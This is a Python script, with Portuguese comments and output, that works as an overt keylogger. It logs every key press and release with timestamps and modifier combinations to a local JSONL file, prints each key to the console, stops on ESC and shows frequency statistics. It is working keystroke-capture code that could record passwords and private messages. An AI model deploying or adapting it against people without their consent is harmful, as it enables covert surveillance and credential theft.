import json
import time
from datetime import datetime
from pathlib import Path
from collections import Counter

from pynput import keyboard


LOG_FILE = Path("keyboard_lab.jsonl")

pressed_modifiers = set()
key_frequency = Counter()

start_time = time.perf_counter()
last_press_time = None
event_count = 0


MODIFIER_KEYS = {
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
}


def normalize_key(key):
    """
    Converte o objeto Key/KeyCode do pynput
    para uma representação legível.
    """

    try:
        if key.char is not None:
            return key.char
    except AttributeError:
        pass

    return str(key).replace("Key.", "")


def modifier_name(key):

    if key in (
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
    ):
        return "CTRL"

    if key in (
        keyboard.Key.shift,
        keyboard.Key.shift_l,
        keyboard.Key.shift_r,
    ):
        return "SHIFT"

    if key in (
        keyboard.Key.alt,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
    ):
        return "ALT"

    return None


def get_modifiers():

    return {
        "ctrl": "CTRL" in pressed_modifiers,
        "shift": "SHIFT" in pressed_modifiers,
        "alt": "ALT" in pressed_modifiers,
    }


def build_combination(key_name):

    modifiers = []

    if "CTRL" in pressed_modifiers:
        modifiers.append("CTRL")

    if "SHIFT" in pressed_modifiers:
        modifiers.append("SHIFT")

    if "ALT" in pressed_modifiers:
        modifiers.append("ALT")

    if key_name.upper() not in modifiers:
        modifiers.append(key_name.upper())

    if len(modifiers) > 1:
        return "+".join(modifiers)

    return None


def save_event(event):

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as file:

        file.write(
            json.dumps(
                event,
                ensure_ascii=False
            )
            + "\n"
        )


def on_press(key):

    global last_press_time
    global event_count

    now_perf = time.perf_counter()

    key_name = normalize_key(key)

    modifier = modifier_name(key)

    if modifier:
        pressed_modifiers.add(modifier)

    interval = None

    if last_press_time is not None:
        interval = now_perf - last_press_time

    last_press_time = now_perf

    key_frequency[key_name] += 1
    event_count += 1

    event = {
        "timestamp": datetime.now().isoformat(
            timespec="milliseconds"
        ),

        "elapsed_seconds": round(
            now_perf - start_time,
            6
        ),

        "event": "press",

        "key": key_name,

        "modifiers": get_modifiers(),

        "combination": build_combination(
            key_name
        ),

        "interval_since_previous_press": (
            round(interval, 6)
            if interval is not None
            else None
        )
    }

    save_event(event)

    print(
        f"[PRESS] "
        f"{key_name:<12} "
        f"mod={event['modifiers']} "
        f"combo={event['combination']}"
    )


def on_release(key):

    global event_count

    key_name = normalize_key(key)

    event_count += 1

    event = {
        "timestamp": datetime.now().isoformat(
            timespec="milliseconds"
        ),

        "elapsed_seconds": round(
            time.perf_counter() - start_time,
            6
        ),

        "event": "release",

        "key": key_name,

        "modifiers": get_modifiers()
    }

    save_event(event)

    modifier = modifier_name(key)

    if modifier:
        pressed_modifiers.discard(modifier)

    if key == keyboard.Key.esc:

        print("\nESC detectado.")
        print("Encerrando monitoramento...")

        return False


def print_statistics():

    duration = time.perf_counter() - start_time

    print("\n" + "=" * 50)

    print("ESTATÍSTICAS")

    print("=" * 50)

    print(
        f"Duração: {duration:.2f} segundos"
    )

    print(
        f"Eventos registrados: {event_count}"
    )

    print(
        f"Teclas diferentes: {len(key_frequency)}"
    )

    print("\nTeclas mais utilizadas:")

    for key, count in key_frequency.most_common(10):

        print(
            f"{key:<15} {count}"
        )

    print(
        f"\nArquivo de log: "
        f"{LOG_FILE.resolve()}"
    )


def main():

    print("=" * 60)
    print("KEYLOGGER")
    print("=" * 60)

   
    print(
        "\nPressione ESC para encerrar.\n"
    )

    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:

        listener.join()

    print_statistics()


if __name__ == "__main__":
    main()